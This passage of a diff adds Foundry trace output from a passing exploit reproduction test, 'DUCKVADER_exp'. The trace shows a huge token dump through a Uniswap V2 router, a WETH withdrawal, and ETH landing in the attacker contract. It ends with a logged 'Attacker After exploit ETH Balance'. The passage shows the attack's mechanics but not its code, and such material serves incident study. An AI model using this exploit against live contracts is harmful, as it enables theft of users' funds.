+    │   │   │   ├─ emit Swap(sender: Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], amount0In: 0, amount1In: 110000000000000000000000000000 [1.1e29], amount0Out: 981901804907398327 [9.819e17], amount1Out: 0, to: Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 9: 0x000000000000000000000000390bb5471e365f6397a6aa152043050fe195e0bc → 0x0000000000000000000000159074a5393795c770253754e067c2a7dd2ec27e5c
+    │   │   │   │   @ 10: 0x00000000000000000000000000000000000000000007b65e8beddce4fc702ee4 → 0x00000000000000000000000000000000000000000bd249f6d53437b1f025feb4
+    │   │   │   │   @ 8: 0x67cef3a70006a6b4df913452ae8e7c35443e0000000000004f1a2f49d67aa773 → 0x67cff17700080a22bd9ddfe9c8ba2c35443e0000000000004179c4cc98a8a2bc
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [457] 0x4200000000000000000000000000000000000006::balanceOf(Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24]) [staticcall]
+    │   │   │   └─ ← [Return] 981901804907398327 [9.819e17]
+    │   │   ├─ [9159] 0x4200000000000000000000000000000000000006::withdraw(981901804907398327 [9.819e17])
+    │   │   │   ├─ [95] Uniswap: V2 Router02::fallback{value: 981901804907398327}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Withdrawal(src: Uniswap: V2 Router02: [0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24], wad: 981901804907398327 [9.819e17])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x9b1c5bf75cd5b8b8e9d62f21b99ccb64a293224d5361076980402429d1b27917: 0x0000000000000000000000000000000000000000000000000da06a7d3dd204b7 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [55] DUCKVADER_exp::receive{value: 981901804907398327}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit ETH Balance", val: 981901804907398327 [9.819e17], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.98s (10.35s CPU time)
+
+Ran 1 test suite in 15.53s (12.98s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
